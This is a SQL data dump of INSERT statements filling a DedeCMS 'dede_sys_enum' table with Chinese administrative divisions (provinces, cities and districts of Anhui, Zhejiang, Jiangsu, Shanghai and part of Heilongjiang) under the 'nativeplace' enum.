INSERT INTO dede_sys_enum VALUES ('17869', '当涂县', '6505.4', 'nativeplace', '6505', '2');
INSERT INTO dede_sys_enum VALUES ('17868', '雨山区', '6505.3', 'nativeplace', '6505', '2');
INSERT INTO dede_sys_enum VALUES ('17867', '花山区', '6505.2', 'nativeplace', '6505', '2');
INSERT INTO dede_sys_enum VALUES ('17866', '金家庄区', '6505.1', 'nativeplace', '6505', '2');
INSERT INTO dede_sys_enum VALUES ('17865', '马鞍山市', '6505', 'nativeplace', '6505', '1');
INSERT INTO dede_sys_enum VALUES ('17864', '凤台县', '6504.6', 'nativeplace', '6505', '2');
INSERT INTO dede_sys_enum VALUES ('17863', '潘集区', '6504.5', 'nativeplace', '6505', '2');
INSERT INTO dede_sys_enum VALUES ('17862', '八公山区', '6504.4', 'nativeplace', '6504', '2');
INSERT INTO dede_sys_enum VALUES ('17861', '谢家集区', '6504.3', 'nativeplace', '6504', '2');
INSERT INTO dede_sys_enum VALUES ('17860', '田家庵区', '6504.2', 'nativeplace', '6504', '2');
INSERT INTO dede_sys_enum VALUES ('17859', '大通区', '6504.1', 'nativeplace', '6504', '2');
INSERT INTO dede_sys_enum VALUES ('17858', '淮南市', '6504', 'nativeplace', '6504', '1');
INSERT INTO dede_sys_enum VALUES ('17857', '固镇县', '6503.7', 'nativeplace', '6504', '2');
INSERT INTO dede_sys_enum VALUES ('17856', '五河县', '6503.6', 'nativeplace', '6504', '2');
INSERT INTO dede_sys_enum VALUES ('17855', '怀远县', '6503.5', 'nativeplace', '6504', '2');
INSERT INTO dede_sys_enum VALUES ('17854', '淮上区', '6503.4', 'nativeplace', '6503', '2');
INSERT INTO dede_sys_enum VALUES ('17853', '禹会区', '6503.3', 'nativeplace', '6503', '2');
INSERT INTO dede_sys_enum VALUES ('17852', '蚌山区', '6503.2', 'nativeplace', '6503', '2');
INSERT INTO dede_sys_enum VALUES ('17851', '龙子湖区', '6503.1', 'nativeplace', '6503', '2');
INSERT INTO dede_sys_enum VALUES ('17850', '蚌埠市', '6503', 'nativeplace', '6503', '1');
INSERT INTO dede_sys_enum VALUES ('17849', '南陵县', '6502.7', 'nativeplace', '6503', '2');
INSERT INTO dede_sys_enum VALUES ('17848', '繁昌县', '6502.6', 'nativeplace', '6503', '2');
INSERT INTO dede_sys_enum VALUES ('17847', '芜湖县', '6502.5', 'nativeplace', '6503', '2');
INSERT INTO dede_sys_enum VALUES ('17846', '鸠江区', '6502.4', 'nativeplace', '6502', '2');
INSERT INTO dede_sys_enum VALUES ('17845', '新芜区', '6502.3', 'nativeplace', '6502', '2');
INSERT INTO dede_sys_enum VALUES ('17844', '马塘区', '6502.2', 'nativeplace', '6502', '2');
INSERT INTO dede_sys_enum VALUES ('17843', '镜湖区', '6502.1', 'nativeplace', '6502', '2');
INSERT INTO dede_sys_enum VALUES ('17842', '芜湖市', '6502', 'nativeplace', '6502', '1');
INSERT INTO dede_sys_enum VALUES ('17841', '肥西县', '6501.7', 'nativeplace', '6502', '2');
INSERT INTO dede_sys_enum VALUES ('17840', '肥东县', '6501.6', 'nativeplace', '6502', '2');
INSERT INTO dede_sys_enum VALUES ('17839', '长丰县', '6501.5', 'nativeplace', '6502', '2');
INSERT INTO dede_sys_enum VALUES ('17838', '包河区', '6501.4', 'nativeplace', '6501', '2');
INSERT INTO dede_sys_enum VALUES ('17837', '蜀山区', '6501.3', 'nativeplace', '6501', '2');
INSERT INTO dede_sys_enum VALUES ('17836', '庐阳区', '6501.2', 'nativeplace', '6501', '2');
INSERT INTO dede_sys_enum VALUES ('17835', '瑶海区', '6501.1', 'nativeplace', '6501', '2');
INSERT INTO dede_sys_enum VALUES ('17834', '合肥市', '6501', 'nativeplace', '6501', '1');
INSERT INTO dede_sys_enum VALUES ('17833', '安徽省', '6500', 'nativeplace', '6500', '0');
INSERT INTO dede_sys_enum VALUES ('17832', '龙泉市', '6011.9', 'nativeplace', '6012', '2');
INSERT INTO dede_sys_enum VALUES ('17831', '景宁畲族自治县', '6011.8', 'nativeplace', '6012', '2');
INSERT INTO dede_sys_enum VALUES ('17830', '庆元县', '6011.7', 'nativeplace', '6012', '2');
INSERT INTO dede_sys_enum VALUES ('17829', '云和县', '6011.6', 'nativeplace', '6012', '2');
INSERT INTO dede_sys_enum VALUES ('17828', '松阳县', '6011.5', 'nativeplace', '6012', '2');
INSERT INTO dede_sys_enum VALUES ('17827', '遂昌县', '6011.4', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17826', '缙云县', '6011.3', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17825', '青田县', '6011.2', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17824', '莲都区', '6011.1', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17823', '丽水市', '6011', 'nativeplace', '6011', '1');
INSERT INTO dede_sys_enum VALUES ('17822', '临海市', '6010.9', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17821', '温岭市', '6010.8', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17820', '仙居县', '6010.7', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17819', '天台县', '6010.6', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17818', '三门县', '6010.5', 'nativeplace', '6011', '2');
INSERT INTO dede_sys_enum VALUES ('17817', '玉环县', '6010.4', 'nativeplace', '6010', '2');
INSERT INTO dede_sys_enum VALUES ('17816', '路桥区', '6010.3', 'nativeplace', '6010', '2');
INSERT INTO dede_sys_enum VALUES ('17815', '黄岩区', '6010.2', 'nativeplace', '6010', '2');
INSERT INTO dede_sys_enum VALUES ('17814', '椒江区', '6010.1', 'nativeplace', '6010', '2');
INSERT INTO dede_sys_enum VALUES ('17813', '台州市', '6010', 'nativeplace', '6010', '1');
INSERT INTO dede_sys_enum VALUES ('17812', '嵊泗县', '6009.4', 'nativeplace', '6009', '2');
INSERT INTO dede_sys_enum VALUES ('17811', '岱山县', '6009.3', 'nativeplace', '6009', '2');
INSERT INTO dede_sys_enum VALUES ('17810', '普陀区', '6009.2', 'nativeplace', '6009', '2');
INSERT INTO dede_sys_enum VALUES ('17809', '定海区', '6009.1', 'nativeplace', '6009', '2');
INSERT INTO dede_sys_enum VALUES ('17808', '舟山市', '6009', 'nativeplace', '6009', '1');
INSERT INTO dede_sys_enum VALUES ('17807', '江山市', '6008.6', 'nativeplace', '6009', '2');
INSERT INTO dede_sys_enum VALUES ('17806', '龙游县', '6008.5', 'nativeplace', '6009', '2');
INSERT INTO dede_sys_enum VALUES ('17805', '开化县', '6008.4', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17804', '常山县', '6008.3', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17803', '衢江区', '6008.2', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17802', '柯城区', '6008.1', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17801', '衢州市', '6008', 'nativeplace', '6008', '1');
INSERT INTO dede_sys_enum VALUES ('17800', '永康市', '6007.9', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17799', '东阳市', '6007.8', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17798', '义乌市', '6007.7', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17797', '兰溪市', '6007.6', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17796', '磐安县', '6007.5', 'nativeplace', '6008', '2');
INSERT INTO dede_sys_enum VALUES ('17795', '浦江县', '6007.4', 'nativeplace', '6007', '2');
INSERT INTO dede_sys_enum VALUES ('17794', '武义县', '6007.3', 'nativeplace', '6007', '2');
INSERT INTO dede_sys_enum VALUES ('17793', '金东区', '6007.2', 'nativeplace', '6007', '2');
INSERT INTO dede_sys_enum VALUES ('17792', '婺城区', '6007.1', 'nativeplace', '6007', '2');
INSERT INTO dede_sys_enum VALUES ('17791', '金华市', '6007', 'nativeplace', '6007', '1');
INSERT INTO dede_sys_enum VALUES ('17790', '嵊州市', '6006.6', 'nativeplace', '6007', '2');
INSERT INTO dede_sys_enum VALUES ('17789', '上虞市', '6006.5', 'nativeplace', '6007', '2');
INSERT INTO dede_sys_enum VALUES ('17788', '诸暨市', '6006.4', 'nativeplace', '6006', '2');
INSERT INTO dede_sys_enum VALUES ('17787', '新昌县', '6006.3', 'nativeplace', '6006', '2');
INSERT INTO dede_sys_enum VALUES ('17786', '绍兴县', '6006.2', 'nativeplace', '6006', '2');
INSERT INTO dede_sys_enum VALUES ('17785', '越城区', '6006.1', 'nativeplace', '6006', '2');
INSERT INTO dede_sys_enum VALUES ('17784', '绍兴市', '6006', 'nativeplace', '6006', '1');
INSERT INTO dede_sys_enum VALUES ('17783', '安吉县', '6005.5', 'nativeplace', '6006', '2');
INSERT INTO dede_sys_enum VALUES ('17782', '长兴县', '6005.4', 'nativeplace', '6005', '2');
INSERT INTO dede_sys_enum VALUES ('17781', '德清县', '6005.3', 'nativeplace', '6005', '2');
INSERT INTO dede_sys_enum VALUES ('17780', '南浔区', '6005.2', 'nativeplace', '6005', '2');
INSERT INTO dede_sys_enum VALUES ('17779', '吴兴区', '6005.1', 'nativeplace', '6005', '2');
INSERT INTO dede_sys_enum VALUES ('17778', '湖州市', '6005', 'nativeplace', '6005', '1');
INSERT INTO dede_sys_enum VALUES ('17777', '桐乡市', '6004.7', 'nativeplace', '6005', '2');
INSERT INTO dede_sys_enum VALUES ('17776', '平湖市', '6004.6', 'nativeplace', '6005', '2');
INSERT INTO dede_sys_enum VALUES ('17775', '海宁市', '6004.5', 'nativeplace', '6005', '2');
INSERT INTO dede_sys_enum VALUES ('17774', '海盐县', '6004.4', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17773', '嘉善县', '6004.3', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17772', '秀洲区', '6004.2', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17771', '秀城区', '6004.1', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17770', '嘉兴市', '6004', 'nativeplace', '6004', '1');
INSERT INTO dede_sys_enum VALUES ('17769', '乐清市', '6003.11', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17768', '瑞安市', '6003.10', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17767', '泰顺县', '6003.9', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17766', '文成县', '6003.8', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17765', '苍南县', '6003.7', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17764', '平阳县', '6003.6', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17763', '永嘉县', '6003.5', 'nativeplace', '6004', '2');
INSERT INTO dede_sys_enum VALUES ('17762', '洞头县', '6003.4', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17761', '瓯海区', '6003.3', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17760', '龙湾区', '6003.2', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17759', '鹿城区', '6003.1', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17758', '温州市', '6003', 'nativeplace', '6003', '1');
INSERT INTO dede_sys_enum VALUES ('17757', '奉化市', '6002.11', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17756', '慈溪市', '6002.10', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17755', '余姚市', '6002.9', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17754', '宁海县', '6002.8', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17753', '象山县', '6002.7', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17752', '鄞州区', '6002.6', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17751', '镇海区', '6002.5', 'nativeplace', '6003', '2');
INSERT INTO dede_sys_enum VALUES ('17750', '北仑区', '6002.4', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17749', '江北区', '6002.3', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17748', '江东区', '6002.2', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17747', '海曙区', '6002.1', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17746', '宁波市', '6002', 'nativeplace', '6002', '1');
INSERT INTO dede_sys_enum VALUES ('17745', '临安市', '6001.13', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17744', '富阳市', '6001.12', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17743', '建德市', '6001.11', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17742', '淳安县', '6001.10', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17741', '桐庐县', '6001.9', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17740', '余杭区', '6001.8', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17739', '萧山区', '6001.7', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17738', '滨江区', '6001.6', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17737', '西湖区', '6001.5', 'nativeplace', '6002', '2');
INSERT INTO dede_sys_enum VALUES ('17736', '拱墅区', '6001.4', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17735', '江干区', '6001.3', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17734', '下城区', '6001.2', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17733', '上城区', '6001.1', 'nativeplace', '6001', '2');
INSERT INTO dede_sys_enum VALUES ('17732', '杭州市', '6001', 'nativeplace', '6001', '1');
INSERT INTO dede_sys_enum VALUES ('17731', '浙江省', '6000', 'nativeplace', '6000', '0');
INSERT INTO dede_sys_enum VALUES ('17730', '泗洪县', '5513.5', 'nativeplace', '5514', '2');
INSERT INTO dede_sys_enum VALUES ('17729', '泗阳县', '5513.4', 'nativeplace', '5513', '2');
INSERT INTO dede_sys_enum VALUES ('17728', '沭阳县', '5513.3', 'nativeplace', '5513', '2');
INSERT INTO dede_sys_enum VALUES ('17727', '宿豫区', '5513.2', 'nativeplace', '5513', '2');
INSERT INTO dede_sys_enum VALUES ('17726', '宿城区', '5513.1', 'nativeplace', '5513', '2');
INSERT INTO dede_sys_enum VALUES ('17725', '宿迁市', '5513', 'nativeplace', '5513', '1');
INSERT INTO dede_sys_enum VALUES ('17724', '姜堰市', '5512.6', 'nativeplace', '5513', '2');
INSERT INTO dede_sys_enum VALUES ('17723', '泰兴市', '5512.5', 'nativeplace', '5513', '2');
INSERT INTO dede_sys_enum VALUES ('17722', '靖江市', '5512.4', 'nativeplace', '5512', '2');
INSERT INTO dede_sys_enum VALUES ('17721', '兴化市', '5512.3', 'nativeplace', '5512', '2');
INSERT INTO dede_sys_enum VALUES ('17720', '高港区', '5512.2', 'nativeplace', '5512', '2');
INSERT INTO dede_sys_enum VALUES ('17719', '海陵区', '5512.1', 'nativeplace', '5512', '2');
INSERT INTO dede_sys_enum VALUES ('17718', '泰州市', '5512', 'nativeplace', '5512', '1');
INSERT INTO dede_sys_enum VALUES ('17717', '句容市', '5511.6', 'nativeplace', '5512', '2');
INSERT INTO dede_sys_enum VALUES ('17716', '扬中市', '5511.5', 'nativeplace', '5512', '2');
INSERT INTO dede_sys_enum VALUES ('17715', '丹阳市', '5511.4', 'nativeplace', '5511', '2');
INSERT INTO dede_sys_enum VALUES ('17714', '丹徒区', '5511.3', 'nativeplace', '5511', '2');
INSERT INTO dede_sys_enum VALUES ('17713', '润州区', '5511.2', 'nativeplace', '5511', '2');
INSERT INTO dede_sys_enum VALUES ('17712', '京口区', '5511.1', 'nativeplace', '5511', '2');
INSERT INTO dede_sys_enum VALUES ('17711', '镇江市', '5511', 'nativeplace', '5511', '1');
INSERT INTO dede_sys_enum VALUES ('17710', '江都市', '5510.7', 'nativeplace', '5511', '2');
INSERT INTO dede_sys_enum VALUES ('17709', '高邮市', '5510.6', 'nativeplace', '5511', '2');
INSERT INTO dede_sys_enum VALUES ('17708', '仪征市', '5510.5', 'nativeplace', '5511', '2');
INSERT INTO dede_sys_enum VALUES ('17707', '宝应县', '5510.4', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17706', '郊　区', '5510.3', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17705', '邗江区', '5510.2', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17704', '广陵区', '5510.1', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17703', '扬州市', '5510', 'nativeplace', '5510', '1');
INSERT INTO dede_sys_enum VALUES ('17702', '大丰市', '5509.9', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17701', '东台市', '5509.8', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17700', '建湖县', '5509.7', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17699', '射阳县', '5509.6', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17698', '阜宁县', '5509.5', 'nativeplace', '5510', '2');
INSERT INTO dede_sys_enum VALUES ('17697', '滨海县', '5509.4', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17696', '响水县', '5509.3', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17695', '盐都区', '5509.2', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17694', '亭湖区', '5509.1', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17693', '盐城市', '5509', 'nativeplace', '5509', '1');
INSERT INTO dede_sys_enum VALUES ('17692', '金湖县', '5508.8', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17691', '盱眙县', '5508.7', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17690', '洪泽县', '5508.6', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17689', '涟水县', '5508.5', 'nativeplace', '5509', '2');
INSERT INTO dede_sys_enum VALUES ('17688', '清浦区', '5508.4', 'nativeplace', '5508', '2');
INSERT INTO dede_sys_enum VALUES ('17687', '淮阴区', '5508.3', 'nativeplace', '5508', '2');
INSERT INTO dede_sys_enum VALUES ('17686', '楚州区', '5508.2', 'nativeplace', '5508', '2');
INSERT INTO dede_sys_enum VALUES ('17685', '清河区', '5508.1', 'nativeplace', '5508', '2');
INSERT INTO dede_sys_enum VALUES ('17684', '淮安市', '5508', 'nativeplace', '5508', '1');
INSERT INTO dede_sys_enum VALUES ('17683', '灌南县', '5507.7', 'nativeplace', '5508', '2');
INSERT INTO dede_sys_enum VALUES ('17682', '灌云县', '5507.6', 'nativeplace', '5508', '2');
INSERT INTO dede_sys_enum VALUES ('17681', '东海县', '5507.5', 'nativeplace', '5508', '2');
INSERT INTO dede_sys_enum VALUES ('17680', '赣榆县', '5507.4', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17679', '海州区', '5507.3', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17678', '新浦区', '5507.2', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17677', '连云区', '5507.1', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17676', '连云港市', '5507', 'nativeplace', '5507', '1');
INSERT INTO dede_sys_enum VALUES ('17675', '海门市', '5506.8', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17674', '通州市', '5506.7', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17673', '如皋市', '5506.6', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17672', '启东市', '5506.5', 'nativeplace', '5507', '2');
INSERT INTO dede_sys_enum VALUES ('17671', '如东县', '5506.4', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17670', '海安县', '5506.3', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17669', '港闸区', '5506.2', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17668', '崇川区', '5506.1', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17667', '南通市', '5506', 'nativeplace', '5506', '1');
INSERT INTO dede_sys_enum VALUES ('17666', '太仓市', '5505.11', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17665', '吴江市', '5505.10', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17664', '昆山市', '5505.9', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17663', '张家港市', '5505.8', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17662', '常熟市', '5505.7', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17661', '相城区', '5505.6', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17660', '吴中区', '5505.5', 'nativeplace', '5506', '2');
INSERT INTO dede_sys_enum VALUES ('17659', '虎丘区', '5505.4', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17658', '金阊区', '5505.3', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17657', '平江区', '5505.2', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17656', '沧浪区', '5505.1', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17655', '苏州市', '5505', 'nativeplace', '5505', '1');
INSERT INTO dede_sys_enum VALUES ('17654', '金坛市', '5504.7', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17653', '溧阳市', '5504.6', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17652', '武进区', '5504.5', 'nativeplace', '5505', '2');
INSERT INTO dede_sys_enum VALUES ('17651', '新北区', '5504.4', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17650', '戚墅堰区', '5504.3', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17649', '钟楼区', '5504.2', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17648', '天宁区', '5504.1', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17647', '常州市', '5504', 'nativeplace', '5504', '1');
INSERT INTO dede_sys_enum VALUES ('17646', '邳州市', '5503.11', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17645', '新沂市', '5503.10', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17644', '睢宁县', '5503.9', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17643', '铜山县', '5503.8', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17642', '沛　县', '5503.7', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17641', '丰　县', '5503.6', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17640', '泉山区', '5503.5', 'nativeplace', '5504', '2');
INSERT INTO dede_sys_enum VALUES ('17639', '贾汪区', '5503.4', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17638', '九里区', '5503.3', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17637', '云龙区', '5503.2', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17636', '鼓楼区', '5503.1', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17635', '徐州市', '5503', 'nativeplace', '5503', '1');
INSERT INTO dede_sys_enum VALUES ('17634', '宜兴市', '5502.8', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17633', '江阴市', '5502.7', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17632', '滨湖区', '5502.6', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17631', '惠山区', '5502.5', 'nativeplace', '5503', '2');
INSERT INTO dede_sys_enum VALUES ('17630', '锡山区', '5502.4', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17629', '北塘区', '5502.3', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17628', '南长区', '5502.2', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17627', '崇安区', '5502.1', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17626', '无锡市', '5502', 'nativeplace', '5502', '1');
INSERT INTO dede_sys_enum VALUES ('17625', '高淳县', '5501.13', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17624', '溧水县', '5501.12', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17623', '六合区', '5501.11', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17622', '江宁区', '5501.10', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17621', '雨花台区', '5501.9', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17620', '栖霞区', '5501.8', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17619', '浦口区', '5501.7', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17618', '下关区', '5501.6', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17617', '鼓楼区', '5501.5', 'nativeplace', '5502', '2');
INSERT INTO dede_sys_enum VALUES ('17616', '建邺区', '5501.4', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17615', '秦淮区', '5501.3', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17614', '白下区', '5501.2', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17613', '武区', '5501.1', 'nativeplace', '5501', '2');
INSERT INTO dede_sys_enum VALUES ('17612', '南京市', '5501', 'nativeplace', '5501', '1');
INSERT INTO dede_sys_enum VALUES ('17611', '江苏省', '5500', 'nativeplace', '5500', '0');
INSERT INTO dede_sys_enum VALUES ('17610', '崇明县', '5019', 'nativeplace', '5019', '1');
INSERT INTO dede_sys_enum VALUES ('17609', '奉贤区', '5018', 'nativeplace', '5018', '1');
INSERT INTO dede_sys_enum VALUES ('17608', '南汇区', '5017', 'nativeplace', '5017', '1');
INSERT INTO dede_sys_enum VALUES ('17607', '青浦区', '5016', 'nativeplace', '5016', '1');
INSERT INTO dede_sys_enum VALUES ('17606', '松江区', '5015', 'nativeplace', '5015', '1');
INSERT INTO dede_sys_enum VALUES ('17605', '金山区', '5014', 'nativeplace', '5014', '1');
INSERT INTO dede_sys_enum VALUES ('17604', '浦东新区', '5013', 'nativeplace', '5013', '1');
INSERT INTO dede_sys_enum VALUES ('17603', '嘉定区', '5012', 'nativeplace', '5012', '1');
INSERT INTO dede_sys_enum VALUES ('17602', '宝山区', '5011', 'nativeplace', '5011', '1');
INSERT INTO dede_sys_enum VALUES ('17601', '闵行区', '5010', 'nativeplace', '5010', '1');
INSERT INTO dede_sys_enum VALUES ('17600', '杨浦区', '5009', 'nativeplace', '5009', '1');
INSERT INTO dede_sys_enum VALUES ('17599', '虹口区', '5008', 'nativeplace', '5008', '1');
INSERT INTO dede_sys_enum VALUES ('17598', '闸北区', '5007', 'nativeplace', '5007', '1');
INSERT INTO dede_sys_enum VALUES ('17597', '普陀区', '5006', 'nativeplace', '5006', '1');
INSERT INTO dede_sys_enum VALUES ('17596', '静安区', '5005', 'nativeplace', '5005', '1');
INSERT INTO dede_sys_enum VALUES ('17595', '长宁区', '5004', 'nativeplace', '5004', '1');
INSERT INTO dede_sys_enum VALUES ('17594', '徐汇区', '5003', 'nativeplace', '5003', '1');
INSERT INTO dede_sys_enum VALUES ('17593', '卢湾区', '5002', 'nativeplace', '5002', '1');
INSERT INTO dede_sys_enum VALUES ('17592', '黄浦区', '5001', 'nativeplace', '5001', '1');
INSERT INTO dede_sys_enum VALUES ('17591', '上海市', '5000', 'nativeplace', '5000', '0');
INSERT INTO dede_sys_enum VALUES ('17590', '漠河县', '4513.3', 'nativeplace', '4513', '2');
INSERT INTO dede_sys_enum VALUES ('17589', '塔河县', '4513.2', 'nativeplace', '4513', '2');
INSERT INTO dede_sys_enum VALUES ('17588', '呼玛县', '4513.1', 'nativeplace', '4513', '2');
INSERT INTO dede_sys_enum VALUES ('17587', '大兴安岭地区', '4513', 'nativeplace', '4513', '1');
INSERT INTO dede_sys_enum VALUES ('17586', '海伦市', '4512.10', 'nativeplace', '4512', '2');
INSERT INTO dede_sys_enum VALUES ('17585', '肇东市', '4512.9', 'nativeplace', '4513', '2');
INSERT INTO dede_sys_enum VALUES ('17584', '安达市', '4512.8', 'nativeplace', '4513', '2');
INSERT INTO dede_sys_enum VALUES ('17583', '绥棱县', '4512.7', 'nativeplace', '4513', '2');
INSERT INTO dede_sys_enum VALUES ('17582', '明水县', '4512.6', 'nativeplace', '4513', '2');
INSERT INTO dede_sys_enum VALUES ('17581', '庆安县', '4512.5', 'nativeplace', '4513', '2');
